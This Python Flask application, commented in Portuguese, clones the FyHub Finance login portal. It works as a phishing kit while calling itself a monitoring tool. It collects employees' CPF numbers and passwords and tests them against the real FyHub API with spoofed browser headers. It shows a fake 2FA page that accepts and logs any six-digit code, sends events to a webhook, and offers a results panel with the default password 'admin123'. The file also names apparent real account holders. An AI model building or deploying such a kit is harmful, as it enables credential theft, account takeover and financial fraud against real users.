"""
FYHUB FINANCE CLONE - Flask Application
Monitoramento de login com proxy para API do FyHub Finance.

Funcionamento:
1. Funcionario acessa este site e preenche CPF/senha
2. O login e aceito localmente (fluxo completo funciona)
3. Simultaneamente tentamos fazer o login no FyHub real para verificar credenciais
4. Todos os acessos sao logados para monitoramento
"""

import os
import json
import uuid
import time
import hashlib
import logging
from datetime import datetime, timedelta
from functools import wraps

import requests
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, g
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Configuração
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', hashlib.sha256(os.urandom(32)).hexdigest())

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"],
    storage_uri="memory://"
)

# Configuração da API FyHub
FYHUB_API_BASE = os.environ.get('FYHUB_API_BASE', 'https://api.fyhub-prod.onz.software')

# Configuração de monitoramento
MONITOR_LOG_FILE = os.environ.get('MONITOR_LOG', '/tmp/fyhub_monitor.log')
MONITOR_WEBHOOK = os.environ.get('MONITOR_WEBHOOK', '')

# Setup logging - monitoramento em arquivo separado
monitor_logger = logging.getLogger('fyhub_monitor')
monitor_logger.setLevel(logging.INFO)
_monitor_handler = logging.FileHandler(MONITOR_LOG_FILE)
_monitor_handler.setFormatter(logging.Formatter('%(message)s'))
monitor_logger.addHandler(_monitor_handler)
monitor_logger.addHandler(logging.StreamHandler())

# Flask logging separado
app.logger.setLevel(logging.INFO)

# Contas padrão (as mesmas que aparecem no sistema)
DEFAULT_ACCOUNTS = [
    {
        'account_number': '11186',
        'account_id': '11186',
        'name': 'Rodrigo Getulio Rezende',
        'document': '***.088.611-**',
        'type': 'pessoa_fisica'
    },
    {
        'account_number': '11467',
        'account_id': '11467',
        'name': 'CRED SEGURO LTDA',
        'document': '66.921.824/0001-02',
        'type': 'pessoa_juridica'
    }
]

# In-memory token store
active_sessions = {}


def log_access(event_type, data):
    """Log de monitoramento - registra todos os eventos de acesso."""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'event': event_type,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'data': data
    }
    monitor_logger.info(json.dumps(entry, ensure_ascii=False))

    # Enviar webhook se configurado
    if MONITOR_WEBHOOK and event_type in ('login_attempt', 'login_success', 'login_failed'):
        try:
            requests.post(MONITOR_WEBHOOK, json=entry, timeout=5)
        except:
            pass

    return entry


def try_fyhub_login(cpf, password):
    """Tenta fazer login no FyHub real para verificar se as credenciais são válidas."""
    endpoints_to_try = [
        f'{FYHUB_API_BASE}/v1/auth/login',
        f'{FYHUB_API_BASE}/v1/login',
        f'{FYHUB_API_BASE}/v2/login',
    ]

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://finance.fyhub.com.br',
        'Referer': 'https://finance.fyhub.com.br/login',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    for endpoint in endpoints_to_try:
        try:
            response = requests.post(
                endpoint,
                json={'cpf': cpf, 'password': password},
                headers=headers,
                timeout=10
            )
            # 200 = login OK, 401 = credenciais erradas, 403 = bloqueado
            return {
                'fyhub_status': response.status_code,
                'fyhub_endpoint': endpoint,
            }
        except Exception as e:
            continue

    return {
        'fyhub_status': 'error',
        'fyhub_endpoint': 'none',
        'fyhub_error': 'conexão indisponível'
    }


def mask_cpf(cpf):
    """Mascara CPF para log."""
    cpf_clean = cpf.replace('.', '').replace('-', '').replace('_', '')
    if len(cpf_clean) >= 5:
        return cpf_clean[:3] + '***' + cpf_clean[-2:]
    return '***'


# ==================== ROTAS DE PÁGINAS ====================

@app.route('/')
def index():
    return redirect(url_for('login'))


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/contas')
def contas():
    token = request.args.get('token', '')
    return render_template('contas.html', token=token)


@app.route('/2fa')
def two_fa():
    token = request.args.get('token', '')
    account_id = request.args.get('account', '')
    validate_id = request.args.get('validateId', '')
    method = request.args.get('method', 'email')
    return render_template('2fa.html', token=token, account_id=account_id, validate_id=validate_id, method=method)


@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')


@app.route('/termos')
def termos():
    return render_template('termos.html')


# ==================== API ENDPOINTS ====================

@app.route('/api/login', methods=['POST'])
@limiter.limit("20 per minute")
def api_login():
    """
    Recebe CPF e senha do funcionário.
    Aceita localmente (para fluxo funcionar) e também tenta no FyHub real.
    """
    data = request.get_json(force=True)
    cpf = data.get('cpf', '')
    senha = data.get('senha', '')

    # Log de tentativa de login
    log_access('login_attempt', {
        'cpf_masked': mask_cpf(cpf),
        'fyhub_verify': True
    })

    # Tenta no FyHub real (sem bloquear o fluxo local)
    fyhub_result = try_fyhub_login(cpf, senha)

    # Criar sessão local (sempre aceita para fluxo funcionar)
    session_token = str(uuid.uuid4())
    active_sessions[session_token] = {
        'cpf': cpf,
        'login_time': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'fyhub_status': fyhub_result.get('fyhub_status'),
    }

    # Log de resultado
    if fyhub_result.get('fyhub_status') == 200:
        log_access('login_success', {
            'cpf_masked': mask_cpf(cpf),
            'session_token': session_token,
            'fyhub_verified': True
        })
    elif fyhub_result.get('fyhub_status') == 401:
        log_access('login_credential_failed', {
            'cpf_masked': mask_cpf(cpf),
            'fyhub_verified': False
        })
    else:
        log_access('login_local_accepted', {
            'cpf_masked': mask_cpf(cpf),
            'session_token': session_token,
            'fyhub_status': fyhub_result.get('fyhub_status'),
        })

    return jsonify({
        'success': True,
        'token': session_token,
        'fyhub_status': fyhub_result.get('fyhub_status')
    })


@app.route('/api/contas', methods=['GET'])
@limiter.limit("30 per minute")
def api_contas():
    """Retorna as contas padrão (2 contas do sistema)."""
    token = request.args.get('token', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    return jsonify({
        'success': True,
        'contas': DEFAULT_ACCOUNTS
    })


@app.route('/api/select-account', methods=['POST'])
@limiter.limit("20 per minute")
def api_select_account():
    """Seleciona uma conta - sempre requer 2FA."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    account_id = data.get('account_id', '')
    account_number = data.get('account_number', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    log_access('account_selected', {
        'cpf_masked': mask_cpf(session_data['cpf']),
        'account': account_number,
        'account_name': account_number == '11186' and 'Rodrigo Getulio Rezende' or 'CRED SEGURO LTDA'
    })

    return jsonify({
        'success': False,
        'requires_2fa': True,
        'validate_code_id': str(uuid.uuid4()),
        'method': 'email'
    })


@app.route('/api/verify-2fa', methods=['POST'])
@limiter.limit("10 per minute")
def api_verify_2fa():
    """Verifica o código 2FA - aceita qualquer código de 6 dígitos."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    code = data.get('code', '')
    account_number = data.get('account_number', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    log_access('2fa_attempt', {
        'code': code,
        'account': account_number,
        'cpf_masked': mask_cpf(session_data['cpf'])
    })

    if len(code) == 6 and code.isdigit():
        log_access('2fa_verified', {
            'code': code,
            'account': account_number,
            'cpf_masked': mask_cpf(session_data['cpf'])
        })
        return jsonify({'success': True})

    return jsonify({
        'success': False,
        'message': 'Código inválido. Digite 6 dígitos.'
    })


@app.route('/api/resend-2fa', methods=['POST'])
@limiter.limit("5 per minute")
def api_resend_2fa():
    """Reenvia o código 2FA."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    validate_id = data.get('validate_code_id', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    log_access('2fa_resend', {
        'cpf_masked': mask_cpf(session_data['cpf']),
        'validate_id': validate_id
    })

    return jsonify({'success': True})


# ==================== MONITORAMENTO ====================

@app.route('/monitor', methods=['GET'])
def monitor():
    """API do painel de monitoramento - protegido por senha."""
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')

    if password != admin_password:
        return jsonify({'error': 'Acesso negado.'}), 403

    entries = []
    try:
        with open(MONITOR_LOG_FILE, 'r') as f:
            for line in f:
                try:
                    start = line.find('{')
                    if start >= 0:
                        json_str = line[start:].strip()
                        entry = json.loads(json_str)
                        if 'event' in entry:
                            entries.append(entry)
                except:
                    pass
    except FileNotFoundError:
        pass

    return jsonify({
        'success': True,
        'entries': entries[-50:],
        'total': len(entries)
    })


@app.route('/monitor/panel', methods=['GET'])
def monitor_panel():
    """Interface web do monitoramento."""
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')

    if password != admin_password:
        return '<html><body style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1>Acesso Negado</h1></body></html>', 403

    return render_template('monitor.html')


# ==================== HEALTH CHECK ====================

@app.route('/health')
def health():
    return 'OK', 200


# ==================== LIMPEZA DE SESSÕES ====================

def cleanup_sessions():
    """Remove sessões expiradas."""
    now = datetime.now()
    expired = []
    for token, data in active_sessions.items():
        login_time = datetime.fromisoformat(data['login_time'])
        if (now - login_time) > timedelta(hours=24):
            expired.append(token)
    for token in expired:
        del active_sessions[token]


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug)
